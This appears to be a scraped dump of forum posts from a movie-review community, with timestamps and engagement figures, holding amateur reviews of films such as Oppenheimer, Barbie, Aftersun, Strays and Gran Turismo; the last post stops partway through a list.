1692531101.0,Barbie was pretty great overall,"Hey so I saw the Barbie movie and it was a lot of fun.  It felt like one of the most original and creative things I’ve seen in a long time from the mainstream movie industry.  The production design, especially in the scenes in Barbie Land, is fantastic and full of visual gags.  The acting performances are also really great, particularly from Ryan Gosling.  I had no idea he was such a good comedy actor.  In every scene he seemed to find ways to make it funnier through his performance.  As far as complaints, I didn’t really care for the storyline about the Mattel executives.  It wasn’t terrible, there were still funny jokes, but it didn’t really go anywhere.  Kinda makes me wonder if there was an earlier version of this movie where they had more to do with the main conflict.  Anyway, I also feel like we should have gotten to know the mother and daughter characters more.  They feel a little underdeveloped considering their importance to the movie.  Anyway, I made a youtube video about the movie where I expand a bit to talk about the political conversations around this movie and what I think it means for the industry.

1692513157.0,"Blue beetle, this movie is absolute garbage. (Spoilers)","I wanna start off by saying, if you have the chance to go watch a movie, please for the love of God watch the BARBIE MOVIE before this. Me and my siblings went to watch this movie, as first when I watched the trailer and it looked bad, I got to the movies, and discorvered that it was even worse than my loe expectations. To start off, legs talk about lore. The ONLY literally the ONLY information about this scarab that is of any actual value to the lore, is that it's an alien. Thats it. Literally I swear to God the only lore they give you abt this thing is that it an alien. They don't even give you half an explanation as to why this scarab opened up to Jamie or why it's at earth or how it was created or why it can do this or why ANYTHING AT ALL. I CANNOT MAKE THIS UP LIKE ACTUALLY, QUITE LITERALLY THE ONLY THING THEY TELL YOU ABOUT IT IS THAT ITS AN ALIEN. And then there's kord and the ""love"" that was formed between Jamie and whatever her name was. Love takes time y'know, not in this movie at all. For some reason, she told Jamie Abt her mother and Shi and they try n kiss??? Jamie did save her I won't deny that but that's the first time she actually showed ANY affection towards him.  Oh and then how predictable this movie was. At a point in the movie they say wtv her name's dad disappeared. At that moment you knew there was going to be a second movie Abt the dad, and the girls prolly gonna get a scarab😱 honestly, this is every other superhero movie ever, just every superhero movie not made by marvel. And thens the fact dc really thought this movie was a good idea?? I struggle to find how this is actually enjoyable. There's a couple funny moments I'll admit, and moments that just don't make sense, like the scene at the house when Jamie gets taken away, that's the corniest and cringiest Shi I've ever seen in a DC movie. And the part when the 3 soldiers had guns to Jamie's head, which,btw, his helmet was not on. Yet FOR SOME REASON THEY JUST, WAITED? Why? They could ended this entire movie right there but ""plot armor"", even so they could've already done something so it's not an easy kill but they just decided to wait around. Then the old lady. She wants the scarab to make, supersoldiers? Idk, sounds kinda familiar does it not? Her entire character is just dumb. Literally the first scene we see her in was basically a dhar mann story. At the end it was just bad acting, I don't think it was the actor more like the people who wrote her character. In my opinion the only good parts where the funny parts, and the fight at the end, other than that everything was just bad. This movie is a solid 3/10 in my opinion.",moviereviews,2646,510,80,0

This film is surprisingly good. A small alien ship crash lands in Milt's backyard, crushing his azalea bushes and nobody takes him seriously. The main characters are all senior citizens and it's a great view into what their lives are like and how their interactions go with the people around them. What I love about the film is how Milt responds to the sudden appearance of the ship and it's sole occupant, and how their friendship actually sparks new relationships in his life.



This isn't a fast and furious sci-fi alien film. It's much smaller and more intimate and sweet. The theater I was in had several families who brought their older parents or grandparents to the film, and it was so heartwarming to see them smiling and hear them laughing during and after the film.

[Below Mid Movie - A Missed Opportunity for Franchise or Cinematic Universe](

Heart of Stone"" promised a blend of action, intrigue, and mystery, but unfortunately missed the opportunity of its potential. While the movie showcased glimpses of good scene rarely, it ultimately failed to deliver a cohesive and engaging storyline.

The film's premise had all the ingredients for a captivating narrative: like how charter was formed or other plots but failed every time. The pacing was uneven, with moments of suspense abruptly interrupted by slow and seemingly irrelevant scenes. This inconsistency disrupted the overall flow of the movie and hindered the building of tension that such a plot required. Action was also not upto the mark and storywise also slow sometimes. Dialogues need to be better also.

As it stands, however, ""Heart of Stone"" made it a missed opportunity for making a franchise or cinematic universe, making it a below-average entry in the genre.

1692036698.0,Aftersun (2022) Review: A Blistering Burn of Boredom and Mediocrity,"Here's my review on Aftersun! Would love to hear from some people that enjoyed this film:

If you’ve ever wanted to waste almost two hours of your life on a film that tries too hard to be “deep” and meaningful, then “Aftersun” by Charlotte Wells is perfect for you! Possibly the most overrated film of 2022, Aftersun is constantly trying to milk every ounce of emotion from viewers in an embarrassing attempt at solidifying itself as some sort of epic tear-jerker. Spoiler alert! It’s not.


Let’s start with Sophie and her oh-so-edgy MiniDV camera. Seriously? Talk about beating a dead horse with the whole “nostalgia” gimmick. Like, we get it, old tech is kinda retro cool, but that doesn’t make up for a plot that’s as thin as watered-down gravy.


And speaking of nostalgia, Wells’ obsession with hammering in throwbacks isn’t just limited to Sophie’s outdated camcorder. The entire film feels like an awkward attempt at forcing sentimentality down our throats. Does she think that by drowning us in a sea of yesteryears, we’ll overlook the glaring plot holes and half-baked character development? Newsflash: Slapping on a vintage filter doesn’t turn a bland story into an instant classic. It’s like putting lipstick on a pig—still a pig.


Then there’s Calum, the angsty 30-something who reads self-help books and does Tai chi. Yawn. Could he BE any more of a walking cliché? And, OMG, the smoking thing? Haven’t we seen that tired trope of “hidden vices” in a gazillion other faux deep films?


The interactions between the father and daughter can be best described as cringe. The whole rug thing? Super predictable! And that awkward karaoke moment? Major second-hand embarrassment. And who picks “Losing My Religion” for karaoke anyway these days? Couldn’t they have picked something that is actually well known for being a karaoke favourite?


But the most “LOL” moment for me? The super mysterious rave scenes. Like, what even is going on there? It’s like Wells thought she’d just chuck in some strobe lights and techno beats and suddenly her movie would become all deep and artsy. Nah, sis. It just looks like a crap budget rave from the ’90s.


Do I even dare talk about the ending? Yes, I do. More tangled and messy than a pair of headphones left in your pocket. Adult Sophie’s life is as bland as unseasoned chicken, and the hints at what happened to Calum are just lazy storytelling. The rug? That’s the emotional tie-in? Might as well have been a lampshade for all I care.


In conclusion, if you’re keen on watching a movie that thinks it’s all deep and touching but is really just a hot mess of meh, then “Aftersun” is your jam. But if you have taste and don’t wanna be bored outta your mind, skip this one. It’s a total dud.

1691950101.0,Harakiri: Overrated Samurai Snoozefest,"From its prolonged sequences to its tedious plot, Masaki Kobayashi’s Harakiri manages to be an exercise in cinematic lethargy. How anyone can laud such a snooze fest is beyond comprehension. Some claim it’s a classic; I say it’s an excellent cure for insomnia.


The pacing is an undeniable flaw in Harakiri. Some might argue that its deliberate pace allows for introspection and suspense-building. However, it often comes off as needlessly prolonged and tiresome.


Scenes that could have been resolved swiftly linger, dragging the narrative down with them. In today’s fast-paced cinematic environment, movies masterfully balance contemplation with brisk storytelling. Yet, Harakiri seems stubbornly anchored in a time-warp.


The frequent pauses and prolonged silences, intended for dramatic effect, often turn into moments of distraction for the audience. This cinematic journey feels less like an exhilarating adventure and more like a tedious chore.


Harakiri’s characters lack the multi-dimensional depth one might expect from such a heralded film. Their motivations, desires, and fears appear superficial and, at times, even ambiguous. Such one-dimensional characterizations leave the audience yearning for more.


Where are the arcs that challenge and transform these individuals? Movies thrive when characters undergo tangible growth or evolution, but such transformative arcs are glaringly absent here. Instead, we are presented with static figures who remain predictably stagnant throughout.


Their predictability turns potentially intense scenes into monotonous exercises. One can often anticipate their every move and word, stripping the plot of any true suspense. The experience is reminiscent of watching paint dry—tediously drawn-out and devoid of any engaging surprises.


Harakiri purports to delve into profound themes, suggesting a narrative depth that should captivate its audience. However, these attempts often come across as surface-level explorations rather than deep dives. Such cursory treatment belies the film’s ambition, reducing its thematic elements to mere pretense.


These shallow puddles, masquerading as profound depths, leave viewers unsatisfied and underwhelmed. Instead of drawing the audience into a thoughtful exploration of its themes, the film skirts around them. The result? A missed opportunity to truly resonate and leave a lasting impact.


Kobayashi’s intentions might have been to make a grand statement, a magnum opus of cinematic storytelling. However, his execution falls woefully short. The film’s inability to deliver on its promise transforms it from a potential masterpiece into a glaring disappointment.


In a nutshell, if you’re in need of a good nap, Harakiri is the film for you. For those seeking entertainment and intrigue, look elsewhere. This film is the cinematic equivalent of a sleeping pill.

1691896598.0,I found Talk to Me to be very vulgar...,"Title. I found myself and others around me constantly cringing at the utterly grotesque violence. On the other hand, this movie also managed to be scary without the use of cheap jumpscares. Honestly I don't know if my memory is a bit hazy, but even with the scary ghost people, I don't recall one moment where they just popped up like ""boo!!!"". Suspense? Yeah. Horrifying antagonists? Also yeah. But the movie achieved all this in addition to a lack of jumpscares. Still though, I was more disgusted than scared. Did anyone else think this was more cringey than scary?

p.s. I don't mean cringe as in second-hand embarassing due to corny dialogue or some dumb shit like that.

I would have agreed with the explosion being not worth the hype to a certain point when I watched it in regular imax on a smaller screen but now that I have watched it in imax 70mm on a significantly larger screen, the explosion was really well done. 

When I watched regular digital imax the explosion was good but not great. The explosion looked smaller and you couldn't see the mushroom as it was cropped (cc Cropenhiemer). Today I watched it in imax 70mm with great seats on a much larger screen and the explosion looked beautiful. You could actually see the whole thing, the mushroom cloud which I didn't fully see previously. 

The movie became a 10/10 for me in the 2nd viewing in the intended watch format.

1691692369.0,Oppenheimer sucks,"I think the fundamental problem with this movie is that it was directed by Christopher Nolan

Christopher Nolan does fine at directing action movies that don't need to engage the viewer in the dialogue, but he has no business making a historical drama. This is a story that needed precision and a defined direction - what it got was an unfocused disaster. 

If it had been a biopic that only focused on Oppenheimer's life up to the creation of the bomb, that would have been good. If it had been a court-focused movie that occasionally flashes back to the creation of the bomb, that would have been good. It instead attempts to weave together like 3 different storylines that detract from each other and required the writers to spoonfeed themes to the audience just to keep track of what's going on. 

Speaking of the writing. This movie needed wit, good writing, and good line delivery to be effective and it had none of those things. Christopher Nolan is notorious for having no eye whatsoever for decent acting or good humor and this is a movie that desperately needed those things. The writing had already set the actors up for failure and the entire movie felt like a dry run as a result. You can tell they were trying to cram a wordy script into a shorter amount of time than they had (which is impressive, with a runtime of 3 hours) and possibly due to the movie being shot on film, they didn't get enough takes to make it good. (Unlike the Social Network, which handled the long-script/shorter-runtime problem extremely effectively). 

There are still a lot of scenes that were almost good - almost, because the entire movie was drowned out by the soundtrack. I don't understand what the logic was behind this. My ears were exhausted by the end of the movie. The scenes that would have had emotional impact were stripped of any effect by the never-ending, ceaseless cellos that lingered for every single scene. There was no dynamic, no opportunity to develop emotional attachments to the characters, no poise, and no taste. Static af

This movie should have been done by the guy that did the King's Speech or the Imitation Game or The Trial of the Chicago Seven or literally anyone else

1691686714.0,“Strays” Review: A Unfunny Trip To The Dog Park,"Walking into my local AMC to attend this press screening, I guess you could say my expectations were decently high. R-rated comedies are a rare thing nowadays, and with the comedic cast attached, I was just hoping for a fun time. Walking into the auditorium, I was shocked to see only 4 other critics in attendance. I only mention this because it was dead silent for most of the runtime. Sure, a few jokes here and there got 1 or 2 people to laugh, but overall the screening was as silent as if we were watching an indie foreign film. Walking out of the theater, not one of us said a single word. We all walked off, contemplating to ourselves what we had just witnessed. I drove home, music off, trying to think about whether I loved or hated this film. And while I do find myself admiring some aspects of this film, in the end, I unfortunately think this film is pretty problematic. 

Let’s start with the positives. The CGI is decent. In our current day and age where these talking dog movies are pretty commonplace, the digital effects here are very well done for the most part. I say for the most part because there are shots that look beautifully rendered and natural, where you actually believe that there’s a real talking dog on screen. These natural looking shots are then sometimes intercut with the most unnatural and grotesque CGI you’ve ever seen, and the dogs go from looking cute to looking like they have a permanent address in the uncanny valley. 

The cast has several standouts. Jamie Foxx as Bug is so fun! He is 100% committed to this role, and his eagerness is very well conveyed. Isla Fisher as Maggie is also great. Casting an Aussie as an Australian Shepherd seems a little on the nose, but trust me when I say that her vocal performance here is full of life and energy. Randall Park as Hunter is hilarious. His character has some of the best jokes in the entire film. I think the best performance of the film, though, easily goes to Will Forte as the terrible owner Doug. Forte is HILARIOUS here! I’m a big fan of his comedic work, and he easily holds his own here. 

Overall, the film is fun enough for what it is, and some of the jokes are actually quite funny and clever. I think there are a lot of points where this film loses it, though. Will Ferrell is unfortunately not that funny here. His character Reggie is obnoxious and really gets on your nerves after a while. The script is very bad as well. I wasn’t expecting the writing to be great in a movie like this, but it somehow was worse than I imagined. I also found the celebrity cameos to be kinda weirdly placed throughout. Whenever one showed up, it took me out of the film completely. 

Amid all these problems, however, I think the major issue with this film is some of the humor. Look, I get that humor is subjective. Everyone has their own comedic taste. So if you think this film is one of the funniest things you’ve ever seen, good on you. However, for me personally, the humor in this was not great. It’s incredibly immature and goes way too far in some scenes. It is also one of those films that thinks repeating the same joke over and over again is funny. None of the humor is original or very unique. The ending wraps up in one of the worst sequences I’ve seen in a film all year so far. Like seriously, the ending left me staring up at the screen in abstract horror, wondering how the hell this finale was even greenlit. 

Overall, “Strays” is exactly what you’d expect from the marketing and creative minds behind it, but manages to be extremely disappointing in the end.

1691586636.0,Oppenheimer,"Structurally, *Oppenheimer* is a par for the course biopic.  What does Nolan do to differentiate his movie from other biopics?  Nolan wants his movie to be more than a convincing performance of someone as a historical figure.  He also steadfastly avoids resorting to the cinematic equivalent of shaking a punitive finger at his subject, as many biopics do.  In sidestepping those traps, he tells Oppenheimer’s story from Oppenheimer’s point of view.  (Call it “decisive subjectivity”.)  Nolan wants to give the audience more than a history lesson.  Instead, he frames Oppenheimer as a man of incredible accomplishment who was also frustratingly blind to his flaws and rationalizations.  This does not mean that Nolan absolves Oppenheimer of his sins.  Nolan never excuses the evil of Oppenheimer’s achievement in any way.  Instead, Nolan shows that Oppenheimer’s downfall was of his own making every step of the way.

Another daring choice Nolan makes with his movie is to tell Oppenheimer’s life from another perspective, that of Lewis Strauss.  By intertwining the two, Nolan paints a portrait of two men who are so consumed with the pursuit of power and glory that they fail to see how they are giving ammunition to their enemies.  Oppenheimer unwisely chose to make an enemy of Strauss, a benefactor and admirer, leading Strauss to destroy Oppenheimer’s credibility in his quest to be nominated as President Truman’s Commerce Secretary.  If this brings echoes of Amadeus, the similarities weren’t lost on Nolan.  Oppenheimer is the disrespectful yet brilliant creative soul, with Strauss in the role of the embittered, talentless hack intent on revenge.  If Nolan had another hour, I would have loved to see parts of Oppenheimer’s life told from the perspective of Kitty, General Leslie Groves (Damon) or lifelong friend Isidor Rabi (David Krumholtz).  Even though it's three hours long, the movie could have included so much more.  As it stands, *Oppenheimer* is a thoroughly engrossing, incredibly intimate portrait of a man who not only was a giant in his field, but also forever altered the course of human history.  Highly Recommended.

1691510818.0,My Oppenheimer Review," Respost because I accidentally used my wife's account lol. 

Seems like this subreddit's been hating on the movie a lot.  Personally, I think I liked it better than a lot of y'all, but I can understand the sentiment.  Personally, I feel like the film could have been structured a lot better.  It's kind of a mess at some parts, especially near the beginning when you're still trying to learn the settings and characters being shown but the movie keeps jumping around so fast.  Probably my biggest gripe is that the movie is not the big spectacle it was marketed as.  Making a slow, dialogue driven movie is fine, but if you market it as a movie that has to be seen in theaters a lot of people are going to be disappointed.  Anyway, I've been starting a film vlog on youtube, so if you wanna hear my full thoughts, check it out:

1691465184.0,"Oppenheimer Review (My first ever review, unedited)","My Thoughts on Oppenheimer

·  Oppenheimer is as Nolan as Nolan gets. Every ounce of this movie is dripping with his love for huge cinematic shots, bouncing timelines, and fast paced editing. 

·  Performances

o  The performances were stellar all around. I was amused seeing all these fantastic actors sitting in a room together all speaking in a vastly different and partially hard to understand accents that all meshed together like a UN conference. RDJ and Cillian Murphy are obviously standouts, no one is surprised there. What did surprise me was the amount of depth that RDJ put into his character. I especially loved the scene when he and Murphy are discussing how to manage nuclear weapons where RDJ’s character takes on a very pro-Hydrogen bomb stance while Oppy is advocating for international cooperation to protect the world from his invention. He gets a solo shot in the middle of the movie that is so dynamic, it in and of itself is enough for his inevitable Oscar nom. Florence Pugh injects some much-needed quirk into her short role, and Damon provides some comic relief, albeit irregularly.  

·  Sound  

o  An issue I found with Nolan’s last movie, Tenet, as did many others, was the sound mixing which made it near impossible to understand what handsome Robert Pattinson was saying. Even just watching his lips move was nearly enough for me to maintain a boner long enough for me to enjoy the mix of noises that was going on in front of me. This time around I found it to be less of an issue, however it was not exactly easy to hear what the characters were saying either. Nolan attempts to use what I think is done best in *Call Me By Your Name* by including the sounds around the characters to make the space feel more lived in. In CMBYN the sound around Chalamet and Hammer interrupt them, make their dialogue dynamic, and add to the feel of the scene. In Oppenheimer, it just clouds the audio and makes my ears squint trying to detect what they’re saying.

o  The sound design in relation to the bomb itself and his visions is just exceptional. No part of this sound was to be complained about. It was creative, gut wrenching, unexpected, and just when you thought you were safe from it, it came back harder than ever.

o  Ludwig kills it again here and creates such a tense, off-putting at times, and beautiful score. I love the use of strings to create both confusion and comfort as one nonsensical riff will spark the start of an amazing piece that provides a lovely transition for what is happening on screen. 

·  Cinematography 

o  Nolan consistently provides some of the best visuals in cinema time and time again with his films and Oppenheimer is no exception. I’m beginning to feel that he himself understands the standard the film community holds him to and injects a few shots here and there that are just breath taking. The colour in each scene, especially as Oppy and Florence Pugh’s character meet for the first time is just delicious. 

o  One thing that is interesting about all of this is the Imax hype that surrounded this film. Something I have complained about for some time now is how movies that are ‘shot in Imax’ only include a few shots that use Imax cameras, and the cut between those that do and do not can be very distracting for those who notice the differing aspect ratios. Here the difference between those in and not in Imax are just ever so different in ratio, but the quality is not even close. What I find frustrating is that in a movie like this one, it could easily have been the single most beautifully shot movie had it used these cameras throughout. I don’t know what this is like yet, but I can imagine that a movie shot like this would induce a three-hour visual orgasm that would ruin sex for me. That being said, this movie does feature more Imax shots than I have ever seen in a movie and I loved them all. I believe that I just love them so much and I’m getting greedy. 

·  Editing

o  One of the problems that I have with Nolan’s work is that the quick cuts from scene to scene, place to place, makes his movies feel like one long trailer. I know that this is exactly what keeps the pace moving along, but it can often remove much of what makes these characters feel real. Instead, it can make it feel like a personal highlight reel of their achievements or shortcomings. Not to say there aren’t any longer shots, rather it makes it feel like you’re being fed the minimum amount of information for you to understand what’s about to happen (especially building up to a crescendo) which can be overwhelming. 

o  In Oppenheimer there are a few cases of this, but Nolan uses the fast pace editing to his advantage here making a three-hour film feel much shorter. There are a couple of plot points involving one major general who is a surprise reveal that I found to be unnecessary and dragged on, but other than that it is a very tight script, and incredibly well written.

·  Subject Matter

o  The themes that are discussed in this movie resonate with me in a way that I’m not sure any other movie has. Its commentary on patriotism, American history, morality, and WWII, take a stance that I was not expecting. As the movie was wrapping up, I finally understood why I thought Nolan picked this project. It wasn’t because of the atomic bomb and how exciting the spectacle of this new weapon was, rather it was the treatment that Oppenheimer receives after the fact by the so-called system that shines in third act. While Nolan focuses on how Oppy himself struggles with the implications that his invention has on mankind, America struggles to impose their narrative on the situation he has created for them. I love that the so called ‘bad guy’ in the movie turns out to be the character who is manipulating the system for personal gain. This movie does not make you root for Oppenheimer because he is portrayed to be a good person, his shortcomings are highlighted throughout. The movie gets you to root against the system that he fought to protect through his work, the very system that is attempting to tear down his legacy. It exposes the faults that fill the political scene and rallies the audience behind its eradication. 

o  I also think Nolan’s treatment of the actual bombing of Hiroshima and Nagasaki is very tactical. To preface this potentially hot take I must say that the reason I decided to become a history teacher is to advocate for the innocent lives lost at the hands of the American government through these bombings, the invasion of Iraq, the Korean and the Vietnam wars. I appreciate that this movie wasn’t a study on Hiroshima and Nagasaki and therefore focuses on Oppenheimer and his reaction to the bombings. Instead of making a point out of how bad the bombings were, Nolan chooses to show Oppy’s reaction to the photos to show how it is affecting the character. This easily could’ve been turned into some anti-nuclear weapon piece of propaganda, but it doesn’t. Nolan keeps his focus on the character which helps the overall narrative of the movie and allows its runtime to be more compact.

·  Overall

o  This movie was far more thought provoking that I had anticipated and it make me think long and hard after about what it was trying to say. I think Nolan perfectly encapsulated Oppy’s beginnings, and the actual invention of the atomic bomb, but in the end its his portrayal of the aftermath that shines the brightest here. Of course, the real credit belongs to those who wrote the book that the movie is based off of, but I salute Nolan for telling a story that goes against the traditional narrative associated with WWII and America. I would give this movie a 9/10, the only reason I don’t give it a 10 is because it didn’t do much for me emotionally which isn’t its intention anyways so I think it could more accurately be given a 9/9.

1691455894.0,Oppenheimer review (spoiler free),"
Honestly one of the better movies I've seen in a long time, but I don't watch movies often these days so I don't know if it's a huge deal.

Many things made this movie very good and very few things made it worse.
Kind of the only bad thing imo is how complex the movie was which makes it difficult to understand especially in all the details with physics and stuff like that.
Also something that can be seen as both positive and negative is that the story was told from two different perspectives
perspective at the same time this gave depth to the story, but also increased the complexity of the film and made the film an almost mandatory 2x watcher to
grasp everything.

Can go into a little bit about what I thought the film did good, for starters they've managed to make a movie about science processes and physics enjoyable for the general public, but at the same time I can imagine it's a hell of a lot better for people who read up on this stuff the subject. Big kudos for that. The acting was ON POINT, robert downey jr. Takes the movie to the next level with something that, for me, was completely unexpected. Extremely emotional performance by him very good.

One thing I always say is make another series really good is when it leaves you thinking afterwards or that it leaves you with some kind of feeling. The same goes for movies. I don't really think it succeeded in leaving a sick feeling afterwards. But during the course of the movie I could feel the tension in the air legit. It could go from half uninterrupted to hearing your own heartbeat and you try not to get your pulse too fast. Much of that effect came from the music. Extremely, extremely good management.

Okay, let's go into the main points that I thought the film had (I'm quite unsure and would have to check it again before I can say anything concrete. Won't check it again soon though fyi)

Okay, superficially, the film is about Oppenheimer, i.e. the person who directed the Manhattan Project and the building of the atomic bomb.

There was some politics in the film which communism and socialism, as well as one of the main questions of the film ""is it right to build an atomic bomb?""

Very superficially, we could see Oppenheimer building the atomic bomb then feeling the consequences that made him regret it.

Although this was the main story of the film, it is not what drives it forward. It goes without saying that the person who built the atomic bomb will feel guilty about The 200,000+ people who died as a result of the weapon

However, what I thought was the absolute best thing to see, as well as the actual main story, were them ethical and moral issues Oppenheimer constantly faced.


Throughout the course of the film, he didn't make ir clear what he thinks about anything at all. At each moral question he managed to find a way to avoid answering himself. He doesn’t answer, but it’s not for others, he avoids answering to avoid facing what he really thinks about what he’s doing.

Either it was a statement like “that we’re building it does not mean we get to choose how to use it"".

Very clear how he lies to himself about not having an opinion. Or he avoids the question altogether.

Throughout the film, he tries to suppress his own opinion. That's something I find VERY interesting, how people react to pressure, how they react to orders (from higher ups and how it can be used as an excuse not to take blame). Also how people react to the consequences of these excuses are very interesting to see.

That IMO is what makes the film accessible and enjoyable for everyone. I think everyone can put themselves in a situation where they don't want to make a decision, even though they have an opinion about what should be done, they find excuses or stupid reasons why things should or shouldn't be done. You justify yourself and your actions.

The final scene was how he reflected on his decision and finally realized the consequences, and that he always knew what he was doing. Very good ending to the film.

Overall: extremely complex film but interesting if you can focus for 3 hours. 8.7/10

1691372556.0,Gran Turismo movie review as a fan of GT games and a fan of racing,"Let me start with some background about myself. I have been a motorsport fan since a young age and have followed F1 religiously. I am also a big fan of the Gran Turismo franchise having spent many hundreds of hours on Gran Turismo 5 and Gran Turismo 6. Having seen the trailer for the new Gran Turismo movie and having heard of the accomplishments of Jann Mardenborough, it got me quite interested in the movie. 

And after having seen the movie here are my thoughts as a GT fan and as a motorsport fan. I will try my best to not give any spoilers.

Positives: 

-the casting was great in my opinion as the actor playing Jann M. was very likeable and relatable. The supporting cast was very good as well with David Harbour portraying the tough but understanding mentor role of Jack Slater quite well conveying the subtle emotions hiding behind his stoic demeanour. 

-The racing scenes were filmed in a very dynamic way that really too inspirations from the game’s opening cinematics. The cars were also very well represented with actual LMPs and GT3 cars filmed on actual racetracks. Most scenes were done in camera in my opinion with very few CGI shots. 

-the sounds of the cars were amazing and very true to life.

-the story was engaging if a bit overly dramatic and there were a lot of references and easter eggs for motorsport fans.

-Jann’s tragic accident was very well represented and fully portrayed the inherent risks involved in racing. The movie also accurately portrays a racing driver bracing for impact during a crash by taking his hands off the steering wheel and crossing them on his chest.

Negatives:

-while the racing scenes were visually very exciting, there are still a lot of cliches from other racing movies present here like pressing the throttle more for overtakes and races ending in a drag race to the finish line. This happed multiple times in the movie when in reality this rarely happens in circuit racing and especially rare in endurance racing where the final race takes place.

-the story while based on Jann’s life was very fictionalized with the events in the movies actually occurring at different points in reality. For example Jann’s freak accident was in 2015 when he was well into his racing career having graduated from GT Academy in 2011. His Le Mans podium was also prior to his crash therefore had no impact on his psychology during the race.

-there are some little details that annoyed me as a racing fan such as when the pit crew swaps out slick tires for semi-slicks when the track was completely dry. There was also a scene when Jann puts the steering wheel on the car without gloves the the next scene he is wearing gloves. Other things I noticed was that the some scenes in the Le Mans race was filmed on the Bugatti circuit which is a smaller circuit nearby that is used for smaller events but only a small section of it is used for the 24 hour race. 

-other nitpicks include the sportsmanship during in some of the racing scenes where one of the drivers deliberately caused an incident. The driver at fault would have had a penalty and a trip to the stewards. I find it ironic that the GT games always promote good sportsmanship while the movie throws all of that out of the window.

Overall I felt that the movie offered some good racing action but hampered somewhat by the overdramatization of real life events and the overt product placements from Sony and Nissan. The first half of the movie felt like a Playstation/Gran Turismo 7 commercial. In addition, the inclusion of video game graphics in some scenes distracted heavily from the drama and felt corny and commercialized.

It felt like the movie wanted to appeal to the gamer audience at the expense of the story and realism which I was looking for as a motorsport fan. I know for a fact that there is a lot of drama and politics in racing and felt that wasn’t explored properly with the movie using tired cliches. The movie had an intriguing story and great visuals and the cars sounds great an captured the excitement and dangers of racing but was held back severely by questionable artistic choices that degraded the movie’s quality.

There is one final thing that bugged me after leaving the cinema is how they utterly wasted the character of Kazunori Yamaguchi, the creator of the Gran Turismo games. He had barely any lines and just stood there without any expressions in almost all of the scenes. Then when the actual Kazunori Yamaguchi, I’ll call him Kaz for short, shows up in a cameo he was more expressive than the actor playing him. I felt like the movie could have had Kaz play himself and it wouldn’t be any different. Kaz in real life is quite an interesting character and is a racer himself but the movie portrayed him as this utterly boring person.",moviereviews,4782,847,46,0
1691321459.0,Keanu (2016) - a Mad Katz film review," ""Keanu"" is a 2016 action-comedy film starring Keegan-Michael Key and Jordan Peele. This review discusses the plot, performances, and overall reception of the film.

[

 

""Keanu"" is a delightful comedy film that successfully combines side-splitting humor with an unexpected dose of heartfelt moments. Released in 2016, the movie stars comedy duo Keegan-Michael Key and Jordan Peele, who prove their talent goes beyond their popular sketch show. Directed by Peter Atencio, ""Keanu"" showcases a unique blend of action, adventure, and absurdity, all revolving around an adorable and elusive feline.

The story follows Rell (Jordan Peele) and Clarence (Keegan-Michael Key), two ordinary friends who find themselves entangled in a world of crime and adventure when Rell adopts an irresistibly cute kitten named Keanu after a devastating breakup. But their lives take an unexpected turn when Keanu is catnapped by a ruthless gang, prompting the two friends to embark on a wild and hilarious quest to rescue their new furry companion.

The film's biggest strength lies in its fantastic comedic performances by Key and Peele, who showcase their unmatched chemistry and comedic timing. Their dynamic duo brings genuine charm and relatability to their characters, making the audience empathize with their quest to save Keanu. Moreover, their impeccable ability to portray various characters throughout the film adds another layer of humor that keeps the viewers laughing throughout.

The supporting cast deserves applause for their memorable performances as well. Method Man, playing the menacing gang leader Cheddar, injects the movie with a perfect balance of intimidation and humor. The interactions between the gang members and Clarence and Rell result in some of the film's funniest moments. Additionally, Anna Faris makes a surprising and hilarious cameo, adding even more laughs to the mix.

As the plot unfolds, ""Keanu"" also touches on themes of friendship, identity, and finding one's true self. The film surprisingly delves into the struggles of navigating masculinity and cultural stereotypes, making it more than just a simple comedy. This unexpected depth adds a layer of emotional connection that elevates ""Keanu"" beyond its initial premise.

The film's pacing is generally spot-on, with non-stop action and comedy keeping viewers engaged from start to finish. However, some moments might feel a bit over-the-top or too far-fetched, but it's all in the spirit of the absurd humor that the film thrives on.

The technical aspects of ""Keanu"" are impressive, especially during action sequences, which are creatively choreographed and entertaining. The soundtrack complements the film's mood, adding to the overall experience.

In conclusion, ""Keanu"" is an uproarious and heartwarming comedy that showcases Key and Peele at their best. With a captivating storyline, superb performances, and a charming feline lead, the film is a must-watch for anyone seeking a good time at the movies. While it may not be a groundbreaking masterpiece, ""Keanu"" undeniably delivers on its promise of laughter and serves as a wonderful reminder of the bond we share with our beloved pets. So, grab your popcorn and prepare to laugh out loud with this feline-filled adventure!",moviereviews,3256,500,80,0
1691318758.0,The Fabelmans (2022),"Long 2 hour + warm and unpretentious romp through Spielberg's upbringing and teen years.

7.7/10
Right on the dot.

In many ways, the movie felt like one of those 80s and 90s TV movie biopics. None of the sequences felt particularly intense or epic.
The acting and dialogue is average.
Textbook Spielberg lighting and camera work.
Basic script. No big plot twists.
From what I can tell the movie is mostly based on a series of real events, in a disjointed order. A few events added in for drama.

The focus is primarily on the Sam's (young Steven Spielberg) relationships with his family. We get to see him explore film making and early direction.
Plenty of 1950s and 1960s American classic iconography on display here. Glorious old GM cars, film reels, typewriters. The Happy Days style set pieces. Old Jewish family members being eccentric etc. Jocks and nerds conflict in HS. Mix in a little Family dysfunction and divorce.
It's all there !!!

One of the scenes of the movie that stood out to me is where Sam films a tall blond jock/ athlete during a big day out type event. On seeing the movie, the jock approaches him and asks him why he did it.
The subtext is that Sam wants this guy to like him or not bully him for being Jewish. A deeper subtext also seems to be Spielberg actually wanted to BE HIM and he feels some sense of loss at being a short, normal looking Jewish kid. 
Could have been a great scene, right?
Without being too preachy.
But it's clunky and almost silly on delivery.

For a movie made in the pandemic crisis era, it perhaps deliberately played it much too safe. The desire for normalcy elevates the movie in my opinion, but only because it was released at a time of insanity. There's very little here that's new or fresh, but it's still likeable enough to enjoy. In fact, it's pretty sweet for an origins story that's not a superhero movie.",moviereviews,1869,338,53,0
1691188720.0,"What do you think is the ideology of ""Being There"" (1979)?","I published an essay on Hal Ashby's ""Being There"" (1979) on my blog, in which I discuss not only why I think the film is of great quality but also what I think it has to say about human nature and how we decipher meaning. I've been thinking about this film a lot lately with the ongoing conversations of Artificial Intelligence, as well as our constant sociopolitical banter. The more I began thinking about it, while also remembering Roger Ebert's review shortly after Deep Blue defeated Kasparov, it dawned on me that the character of Chance/Chauncey exposes the artificiality of human nature. Do any of us genuinely believe in an ideology? Are all ways of life, whether it be technology, politics, and religion, just meaningless unless we convince ourselves of someone/something that provides meaning to us?

Much of this was also influenced by my reading in Film Theory last year. One section of the course discussed ideology in cinema, with readings by Jean-Louis Comolli and Jean Narboni. They express seven different ways a film can relate to ideology:

1. Dominant Cinema
2. Politics of Signifier and Signified
3. Politics of Signifier (Political Form)
4. Politics of Signified (Political Content)
